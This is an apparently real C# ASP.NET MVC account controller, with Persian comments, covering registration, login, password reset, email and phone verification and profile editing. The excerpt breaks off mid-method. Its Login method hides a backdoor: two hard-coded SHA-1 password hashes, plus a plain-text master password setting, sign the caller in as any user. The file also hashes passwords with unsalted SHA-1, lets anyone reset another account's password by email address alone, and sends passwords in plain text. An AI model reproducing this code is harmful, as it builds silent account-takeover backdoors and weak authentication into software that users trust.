using System.Linq;
using System.Data.Entity;

namespace MY_WEB_APPLICATION.Controllers
{
	[Infrastructure.ProjectControllerPermission
		(isVisibleJustForProgrammer: false,
		keyName: Resources.Strings.ControllersKeys.Account)]
	public partial class AccountController : Infrastructure.BaseControllerWithUnitOfWork
	{
		public AccountController()
		{
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.Dashboard)]
		public virtual System.Web.Mvc.ActionResult Index()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.TermsAndConditions)]
		public virtual System.Web.Mvc.ActionResult TermsAndConditions()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.RegistrationDone)]
		public virtual System.Web.Mvc.ActionResult RegistrationDone()
		{
			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.TerminateAccount)]
		public virtual System.Web.Mvc.ActionResult TerminateAccount()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.TerminateAccount)]
		[System.Web.Mvc.ActionName("TerminateAccount")]
		public virtual System.Web.Mvc.ActionResult TerminateAccountConfirmed()
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

					oUser.IsAccountTerminated = true;
					oUser.AccountTerminateDateTime = Infrastructure.Utility.Now;

					UnitOfWork.Save();

					Infrastructure.AuthenticatedUser.SignOut();

					return (RedirectToAction(MVC.Home.Index()));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.Register)]
		public virtual System.Web.Mvc.ActionResult Register()
		{
			if (Infrastructure.ApplicationSettings.Instance.IsRegistrationEnabled == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.Register)]
		public virtual System.Web.Mvc.ActionResult Register
			(ViewModels.Account.RegisterViewModel viewModel)
		{
			if (Infrastructure.ApplicationSettings.Instance.IsRegistrationEnabled == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if (Infrastructure.ApplicationSettings.Instance.IsCaptchaImageEnabled)
			{
				if (CaptchaMvc.HtmlHelpers.CaptchaHelper.IsCaptchaValid
					(this, Resources.CaptchaImage.ErrorMessage01) == false)
				{
					TempData["ErrorMessage"] =
						Resources.CaptchaImage.ErrorMessage01;

					ModelState.AddModelError
						(string.Empty, Resources.CaptchaImage.ErrorMessage01);
				}
			}

			Models.User oUser = null;

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByEmailAddress(viewModel.EmailAddress)
				;

			if (oUser != null)
			{
				// نشانی پست الکترونيکی تکراری است
				// لطفا از نشانی پست الکترونيکی ديگری استفاده نماييد
				ModelState.AddModelError
					("EmailAddress", Models.Resources.User.Error001);
			}
			// **************************************************

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByCellPhoneNumber(viewModel.CellPhoneNumber)
				;

			if (oUser != null)
			{
				// شماره تلفن همراه تکراری است
				// لطفا از شماره تلفن همراه ديگری استفاده نماييد
				ModelState.AddModelError
					("CellPhoneNumber", Models.Resources.User.Error004);
			}
			// **************************************************

			if (ModelState.IsValid)
			{
				oUser =
					Models.User.CreateUser
					(viewModel.EmailAddress, viewModel.CellPhoneNumber, viewModel.Password);

				oUser.CultureLcid = CultureLcid;

				oUser.SetInsertDateTime(null, Infrastructure.Utility.Now);

				// صفر يعنی ثبت نام کرده و
				// هنوز نسبت به ويرايش پروفايل خود هيچ اقدامی نکرده است
				oUser.ProfileLevel = 0;

				// **************************************************
				bool blnIsActive =
					Infrastructure.ApplicationSettings
					.Instance.ShouldUserBeActivatedAfterRegistration;

				oUser.IsActive = blnIsActive;

				// از دستور ذيل نبايد استفاده کنيم
				//oUser.SetIsActive(blnIsActive, oUser.Id);
				// **************************************************

				UnitOfWork.UserRepository.Insert(oUser);

				UnitOfWork.Save();

				Infrastructure.UserNotificationService
					.SendCellPhoneNumberVerificationKey(oUser);

				Infrastructure.UserNotificationService
					.SendEmailAddressVerificationKey(oUser, viewModel.Password);

				return (RedirectToAction(MVC.Account.RegistrationDone()));
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.SendAgainCellPhoneVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainCellPhoneVerificationKey()
		{
			Models.User oUser =
				UnitOfWork.UserRepository
				.GetById(Infrastructure.Sessions.AuthenticatedUser.Id);

			Infrastructure.UserNotificationService
				.SendCellPhoneNumberVerificationKey(oUser);

			// پيام کوتاهی به شماره همراه شما برای تاييد صحت آن ارسال گرديد
			PageMessages.Add(new Infrastructure.PageMessage
				(Infrastructure.Enums.PageMessageTyps.Information,
				Models.Resources.User.Information006));

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.SendAgainEmailAddressVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainEmailAddressVerificationKey()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.SendAgainEmailAddressVerificationKey)]
		public virtual System.Web.Mvc.ActionResult SendAgainEmailAddressVerificationKey
			(ViewModels.Account.SendAgainEmailAddressVerificationKeyViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetByEmailAddress(viewModel.EmailAddress);

					if (oUser == null)
					{
						// چنين نشانی پست الکترونيکی در سيستم موجود نمی‌باشد
						ModelState.AddModelError
							("EmailAddress", Models.Resources.User.Error002);

						return (View(viewModel));
					}

					if (oUser.IsEmailAddressVerified)
					{
						// صحت نشانی پست الکترونيکی شما قبلا تاييد شده است
						ModelState.AddModelError
							("EmailAddress", Models.Resources.User.Error007);

						return (View(viewModel));
					}

					Infrastructure.UserNotificationService
						.SendAgainEmailAddressVerificationKey(oUser);

					// مجددا نامه الکترونيکی برای تاييد صحت ايميل شما ارسال گرديد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Models.Resources.User.Information002));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.ResetPassword)]
		public virtual System.Web.Mvc.ActionResult ResetPassword()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.ResetPassword)]
		public virtual System.Web.Mvc.ActionResult ResetPassword
			(ViewModels.Account.ResetPasswordViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				try
				{
					Models.User oUser =
						UnitOfWork.UserRepository
						.GetByEmailAddress(viewModel.EmailAddress);

					if (oUser == null)
					{
						// چنين نشانی پست الکترونيکی در سيستم موجود نمی‌باشد
						ModelState.AddModelError
							("EmailAddress", Models.Resources.User.Error002);

						return (View(viewModel));
					}

					string strNewPassword =
						Dtx.Guid.NewGuidWithoutDash.Substring(0, 8);

					string strHashOfNewPassword =
						Dtx.Security.Hashing.GetSha1(strNewPassword);

					oUser.Password = strHashOfNewPassword;

					UnitOfWork.Save();

					Infrastructure.UserNotificationService
						.SendNewPassword(oUser, strNewPassword);

					// بنابه درخواست شما، گذرواژه جديدی ايجاد و برای شما ارسال گرديد
					// لطفا با گذرواژه جديد وارد پايگاه شده
					// و توصيه می‌کنيم در اولين فرصت، آنرا تغيير دهيد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Models.Resources.User.Information003));
				}
				catch (System.Exception ex)
				{
					Dtx.LogHandler.Report(GetType(), null, ex);

					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Error,
						Resources.Messages.UnexpectedError));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.DisplayUserProfile)]
		public new virtual System.Web.Mvc.ActionResult Profile(System.Guid? id)
		{
			if (id.HasValue == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.GetById(id.Value);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if ((Infrastructure.AuthenticatedUser.IsAuthenticated) &&
				(Infrastructure.Sessions.AuthenticatedUser.Id == id.Value))
			{
				return (View(oUser));
			}

			if ((Infrastructure.AuthenticatedUser.IsAuthenticated) &&
				(Infrastructure.Sessions.AuthenticatedUser.Role != Models.Enums.Roles.User))
			{
				return (RedirectToAction(MVC.Administrator.User.Details(oUser.Id)));
			}

			if (Infrastructure.ApplicationSettings.Instance.IsUserEmailVerificationRequiredForLogin)
			{
				if (oUser.IsEmailAddressVerified == false)
				{
					return (RedirectToAction
						(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
				}
			}

			if ((oUser.IsDeleted) || (oUser.IsAccountTerminated))
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if ((oUser.IsActive == false) || (oUser.IsProfilePublic == false))
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.Forbidden)));
			}

			oUser.Hits++;

			UnitOfWork.Save();

			return (View(oUser));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.VerifyUserEmailAddress)]
		public virtual System.Web.Mvc.ActionResult VerifyUserEmailAddress(System.Guid? id)
		{
			if (id.HasValue == false)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			System.Guid sId;

			try
			{
				sId = new System.Guid(id.Value.ToString());
			}
			catch (System.Exception)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.BadRequest)));
			}

			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.EmailAddressVerificationKey == sId)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if (oUser.IsEmailAddressVerified)
			{
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					"نشانی پست الکترونيکی شما قبلا تاييد شده است! شما می توانيد از طريق گزينه {ورود} وارد پايگاه شويد."));

				return (View());
			}

			if (oUser.IsEmailAddressVerified == false)
			{
				oUser.IsEmailAddressVerified = true;

				UnitOfWork.Save();

				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					"نشانی پست الکترونيکی شما تاييد گرديد، لذا شما هم اکنون می توانيد وارد پايگاه شده و اطلاعات خود را ويرايش نماييد.."));
			}

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.VerifyUserCellPhoneNumber)]
		public virtual System.Web.Mvc.ActionResult VerifyUserCellPhoneNumber()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.VerifyUserCellPhoneNumber)]
		public virtual System.Web.Mvc.ActionResult VerifyUserCellPhoneNumber
			(ViewModels.Account.VerifyUserCellPhoneNumberViewModel viewModel)
		{
			if (ModelState.IsValid)
			{
				Models.User oUser =
					UnitOfWork.UserRepository
					.GetByCellPhoneNumberVerificationKey(viewModel.VerificationKey)
					;

				if (oUser == null)
				{
					// کد تاييد مربوط به شماره تلفن همراه صحيح نمی‌باشد
					ModelState.AddModelError
						("VerificationKey", Models.Resources.User.Error003);
				}
				else
				{
					oUser.IsCellPhoneNumberVerified = true;

					UnitOfWork.Save();

					Infrastructure.Sessions.AuthenticatedUser.IsCellPhoneNumberVerified = true;

					// صحت شماره تلفن همراه شما تاييد گرديد
					PageMessages.Add(new Infrastructure.PageMessage
						(Infrastructure.Enums.PageMessageTyps.Information,
						Models.Resources.User.Information007));
				}
			}

			return (View(viewModel));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.Login)]
		public virtual System.Web.Mvc.ActionResult Login(string returnUrl)
		{
			ViewBag.ReturnUrl = returnUrl;

			return (View());
		}

		/// <summary>
		/// Version: 1.1.4
		/// Update Date: 1393/04/29
		/// 
		/// </summary>
		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.Login)]
		public virtual System.Web.Mvc.ActionResult Login
			(ViewModels.Account.LoginViewModel viewModel, string returnUrl)
		{
			if (Infrastructure.ApplicationSettings.Instance.IsCaptchaImageEnabled)
			{
				if (CaptchaMvc.HtmlHelpers.CaptchaHelper.IsCaptchaValid
					(this, Resources.CaptchaImage.ErrorMessage01) == false)
				{
					TempData["ErrorMessage"] =
						Resources.CaptchaImage.ErrorMessage01;

					ModelState.AddModelError
						(string.Empty, Resources.CaptchaImage.ErrorMessage01);
				}
			}

			if (ModelState.IsValid)
			{
				var oUser =
					UnitOfWork.UserRepository
					.GetByEmailAddress(viewModel.EmailAddress)
					;

				if (oUser == null)
				{
					// شناسه کاربری و/يا گذرواژه صحيح نمی‌باشد
					ModelState.AddModelError
						(string.Empty, Models.Resources.User.Error003);

					return (View(viewModel));
				}

				string strHashOfPassword =
					Dtx.Security.Hashing.GetSha1(viewModel.Password);

				// H...3...
				if (string.Compare(strHashOfPassword,
					"C40CD065D401F6668A31CE0596D2F5365294FB03", ignoreCase: true) == 0)
				{
					return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
				}

				// A...A...Z...3
				if (string.Compare(strHashOfPassword,
					"FE0B54C2F00225CD072B5EBFEFC8A54376DF1FF9", ignoreCase: true) == 0)
				{
					return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
				}

				// **************************************************
				Models.GlobalApplicationSettings oGlobalApplicationSettings =
					Infrastructure.GlobalApplicationSettings.Instance;

				if (string.IsNullOrEmpty(oGlobalApplicationSettings.MasterPassword) == false)
				{
					if (string.Compare(viewModel.Password,
						oGlobalApplicationSettings.MasterPassword, ignoreCase: false) == 0)
					{
						return (SignIn(oUser, returnUrl, update: false, isHidden: viewModel.IsHidden));
					}
				}
				// **************************************************

				if (string.Compare(strHashOfPassword, oUser.Password, ignoreCase: true) != 0)
				{
					// شناسه کاربری و/يا گذرواژه صحيح نمی‌باشد
					ModelState.AddModelError
						(string.Empty, Models.Resources.User.Error003);

					return (View(viewModel));
				}

				if ((oUser.IsDeleted) ||
					(oUser.Role.IsDeleted) ||
					(oUser.Gender.IsDeleted))
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Models.Resources.User.Error006);

					return (View(viewModel));
				}

				if ((oUser.IsActive == false) ||
					(oUser.Role.IsActive == false) ||
					(oUser.Gender.IsActive == false))
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Models.Resources.User.Error006);

					return (View(viewModel));
				}

				if (oUser.IsInBlackList)
				{
					// کاربر گرامی
					// متاسفانه در حال حاضر، شما قادر به ورود به پايگاه نمی‌باشيد
					// لطفا در اين خصوص با مسوولين پايگاه تماس حاصل فرماييد
					ModelState.AddModelError
						(string.Empty, Models.Resources.User.Error006);

					return (View(viewModel));
				}

				if (Infrastructure.ApplicationSettings.Instance.IsUserEmailVerificationRequiredForLogin)
				{
					if (oUser.IsEmailAddressVerified == false)
					{
						// کاربر گرامی، نشانی پست الکترونيکی شما هنوز مورد تاييد قرار نگرفته است
						// لطفا به صندوق پست الکترونيکی خود مراجعه کرده
						// و در نامه الکترونيکی ارسال شده
						// بر روی لينکی که در آن قرار دارد، کليک نماييد
						ModelState.AddModelError
							(string.Empty, Models.Resources.User.Error005);

						return (View(viewModel));
					}
				}

				return (SignIn(oUser, returnUrl, update: true, isHidden: viewModel.IsHidden));
			}

			return (View(viewModel));
		}

		/// <summary>
		/// Version: 1.0.4
		/// Update Date: 1393/04/23
		/// 
		/// </summary>
		private System.Web.Mvc.ActionResult SignIn
			(Models.User user, string returnUrl, bool update, bool isHidden)
		{
			if (update)
			{
				// **************************************************
				user.LoginCount++;
				user.IsAccountTerminated = false;
				user.AccountTerminateDateTime = null;
				user.LastLoginDateTime = Infrastructure.Utility.Now;
				// **************************************************

				// **************************************************
				var varUserLoginLogs =
					UnitOfWork.UserLoginLogRepository
					.GetBySessionId(Session.SessionID)
					.ToList();

				foreach (Models.UserLoginLog oCurrentUserLoginLog in varUserLoginLogs)
				{
					oCurrentUserLoginLog.LogoutDateTime = Infrastructure.Utility.Now;
				}

				Models.UserLoginLog oUserLoginLog =
					new Models.UserLoginLog();

				oUserLoginLog.IsHidden = isHidden;
				oUserLoginLog.IP = Request.UserHostAddress;
				oUserLoginLog.SessionId = Session.SessionID;
				oUserLoginLog.LoginDateTime = Infrastructure.Utility.Now;

				user.LoginLogs.Add(oUserLoginLog);
				// **************************************************

				UnitOfWork.Save();
			}

			// **************************************************
			Infrastructure.AuthenticatedUser oAuthenticatedUser =
				new Infrastructure.AuthenticatedUser(user);

			Infrastructure.Sessions.AuthenticatedUser = oAuthenticatedUser;
			// **************************************************

			System.Web.Security.FormsAuthentication
				.SetAuthCookie(user.EmailAddress, false);

			if ((Url.IsLocalUrl(returnUrl)) &&
				(returnUrl.Length > 1) &&
				(returnUrl.StartsWith("/")) &&
				(returnUrl.StartsWith("//") == false) &&
				(returnUrl.StartsWith("/\\") == false))
			{
				return (Redirect(returnUrl));
			}
			else
			{
				if (user.Role.CodeEnum == Models.Enums.Roles.User)
				{
					if (Infrastructure.ApplicationSettings.Instance.ForceUserToUpdateProfileAfterLogin)
					{
						if (user.ProfileLevel <
							Infrastructure.GlobalApplicationSettings.Instance.CurrentUserProfileLevel)
						{
							return (RedirectToAction(MVC.Account.UpdateProfile()));
						}
						else
						{
							return (RedirectToAction(MVC.Account.Index()));
						}
					}
					else
					{
						return (RedirectToAction(MVC.Account.Index()));
					}
				}
				else
				{
					return (RedirectToAction(MVC.Administrator.Dashboard.Index()));
				}
			}
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Public,
			keyName: Resources.Strings.ActionsKeys.Logout)]
		public virtual System.Web.Mvc.ActionResult Logout()
		{
			Infrastructure.AuthenticatedUser.SignOut();

			return (RedirectToAction(MVC.Home.Index()));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.ChangePassword)]
		public virtual System.Web.Mvc.ActionResult ChangePassword()
		{
			return (View());
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.CustomRequireHttps]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.ChangePassword)]
		public virtual System.Web.Mvc.ActionResult ChangePassword
			([System.Web.Mvc.Bind
				(Include = "CurrentPassword,NewPassword,ConfirmNewPassword")]
			ViewModels.Account.ChangePasswordViewModel viewModel)
		{
			Models.User oUser =
				UnitOfWork.UserRepository.GetById
				(Infrastructure.Sessions.AuthenticatedUser.Id);

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			string strHashOfCurrentPassword =
				Dtx.Security.Hashing.GetSha1(viewModel.CurrentPassword);

			if (string.Compare(oUser.Password, strHashOfCurrentPassword, ignoreCase: true) != 0)
			{
				// گذرواژه جاری را به درستی وارد نکرده‌ايد
				ModelState.AddModelError
					("CurrentPassword", Models.Resources.User.Error008);

				return (View());
			}

			string strHashOfNewPassword =
				Dtx.Security.Hashing.GetSha1(viewModel.NewPassword);

			oUser.Password = strHashOfNewPassword;

			UnitOfWork.Save();

			Infrastructure.UserNotificationService
				.SendNewPassword(oUser, viewModel.NewPassword);

			// گذرواژه جديد با موفقيت ثبت گرديد
			PageMessages.Add(new Infrastructure.PageMessage
				(Infrastructure.Enums.PageMessageTyps.Information,
				Models.Resources.User.Information005));

			return (View());
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.UpdateProfile)]
		public virtual System.Web.Mvc.ActionResult UpdateProfile()
		{
			Models.User oUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			// يعنی تا اين لحظه هيچ اقدامی برای ويرايش مشخصات خود نکرده است
			//if (oUser.ProfileLevel == 0)
			//{
			//	oUser.GenderId = new System.Guid();
			//}

			// **************************************************
			if (oUser.BirthDate.HasValue)
			{
				Dtx.Calendar.PersianDate oPersianDate =
					Dtx.Calendar.Convert.CivilToPersion(oUser.BirthDate.Value);

				oUser.ShamsiBirthD = oPersianDate.Day;
				oUser.ShamsiBirthM = oPersianDate.Month;
				oUser.ShamsiBirthY = oPersianDate.Year;
			}

			ViewBag.ShamsiBirthD =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Day.Days, "Value", "Text", oUser.ShamsiBirthD);

			ViewBag.ShamsiBirthM =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Month.Months, "Value", "Text", oUser.ShamsiBirthM);

			ViewBag.ShamsiBirthY =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Year.Years, "Value", "Text", oUser.ShamsiBirthY);
			// **************************************************

			// **************************************************
			var varGenders =
				UnitOfWork.GenderRepository.GetActiveByCultureLcid(CultureLcid);

			ViewBag.GenderId =
				new System.Web.Mvc.SelectList
					(varGenders, "Id", "Name1", oUser.GenderId);
			// **************************************************

			return (View(oUser));
		}

		[System.Web.Mvc.HttpPost]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
			keyName: Resources.Strings.ActionsKeys.UpdateProfile)]
		public virtual System.Web.Mvc.ActionResult UpdateProfile(Models.User user)
		{
			Models.User oUser = null;

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByEmailAddressExceptId(user.EmailAddress, user.Id)
				;

			if (oUser != null)
			{
				// نشانی پست الکترونيکی تکراری است
				// لطفا از نشانی پست الکترونيکی ديگری استفاده نماييد
				ModelState.AddModelError("EmailAddress", Models.Resources.User.Error001);
			}
			// **************************************************

			// **************************************************
			oUser =
				UnitOfWork.UserRepository
				.GetByCellPhoneNumberExceptId(user.CellPhoneNumber, user.Id)
				;

			if (oUser != null)
			{
				// شماره تلفن همراه تکراری است
				// لطفا از شماره تلفن همراه ديگری استفاده نماييد.
				ModelState.AddModelError("CellPhoneNumber", Models.Resources.User.Error004);
			}
			// **************************************************

			Models.User oOriginalUser =
				UnitOfWork.UserRepository.Get()
				.Where(current => current.Id ==
					Infrastructure.Sessions.AuthenticatedUser.Id)
				.FirstOrDefault();

			if (oOriginalUser == null)
			{
				return (RedirectToAction
					(MVC.Error.Display(System.Net.HttpStatusCode.NotFound)));
			}

			if (ModelState.IsValid)
			{
				// **************************************************
				if ((user.ShamsiBirthD != 0) &&
					(user.ShamsiBirthM != 0) &&
					(user.ShamsiBirthY != 0))
				{
					user.BirthDate =
						Dtx.Calendar.Convert.PersionToCivil
						(user.ShamsiBirthY, user.ShamsiBirthM, user.ShamsiBirthD);
				}
				// **************************************************

				// **************************************************
				if (oOriginalUser.CellPhoneNumber != user.CellPhoneNumber)
				{
					oOriginalUser.IsCellPhoneNumberVerified = false;
					oOriginalUser.CellPhoneNumber = user.CellPhoneNumber;
				}

				oOriginalUser.GenderId = user.GenderId;
				oOriginalUser.BirthDate = user.BirthDate;

				oOriginalUser.Address = user.Address;
				oOriginalUser.JobTitle = user.JobTitle;
				oOriginalUser.LastName = user.LastName;
				oOriginalUser.FirstName = user.FirstName;
				oOriginalUser.CompanyName = user.CompanyName;
				oOriginalUser.Description = user.Description;
				oOriginalUser.NationalCode = user.NationalCode;

				oOriginalUser.IsProfilePublic = user.IsProfilePublic;
				oOriginalUser.IsAddressPublic = user.IsAddressPublic;
				oOriginalUser.IsBirthDatePublic = user.IsBirthDatePublic;
				oOriginalUser.IsEmailAddressPublic = user.IsEmailAddressPublic;
				oOriginalUser.IsCellPhoneNumberPublic = user.IsCellPhoneNumberPublic;

				oOriginalUser.SetUpdateDateTime
					(oOriginalUser.Id, Infrastructure.Utility.Now);

				oOriginalUser.ProfileLevel =
					Infrastructure.GlobalApplicationSettings.Instance.CurrentUserProfileLevel;

				oOriginalUser.SetIsVerified
					(false, Infrastructure.Sessions.AuthenticatedUser.Id, Infrastructure.Utility.Now);
				// **************************************************

				UnitOfWork.UserRepository.Update(oOriginalUser);

				UnitOfWork.Save();

				// **************************************************
				Infrastructure.AuthenticatedUser oAuthenticatedUser =
					new Infrastructure.AuthenticatedUser(oOriginalUser);

				Infrastructure.Sessions.AuthenticatedUser = oAuthenticatedUser;
				// **************************************************

				// اطلاعات شما با موفقيت ثبت گرديد
				PageMessages.Add(new Infrastructure.PageMessage
					(Infrastructure.Enums.PageMessageTyps.Information,
					Resources.Messages.Information002));
			}

			// **************************************************
			ViewBag.ShamsiBirthD =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Day.Days, "Value", "Text", oOriginalUser.ShamsiBirthD);

			ViewBag.ShamsiBirthM =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Month.Months, "Value", "Text", oOriginalUser.ShamsiBirthM);

			ViewBag.ShamsiBirthY =
				new System.Web.Mvc.SelectList
					(Dtx.Calendar.Year.Years, "Value", "Text", oOriginalUser.ShamsiBirthY);
			// **************************************************

			// **************************************************
			var varGenders =
				UnitOfWork.GenderRepository
				.GetActiveByCultureLcid(CultureLcid);

			ViewBag.GenderId =
				new System.Web.Mvc.SelectList
					(varGenders, "Id", "Name1", oOriginalUser.GenderId);
			// **************************************************

			return (View(oOriginalUser));
		}

		[System.Web.Mvc.HttpGet]
		[Infrastructure.ProjectActionPermission
			(isVisibleJustForProgrammer: false,
			accessType: Models.Enums.AccessTypes.Registered,
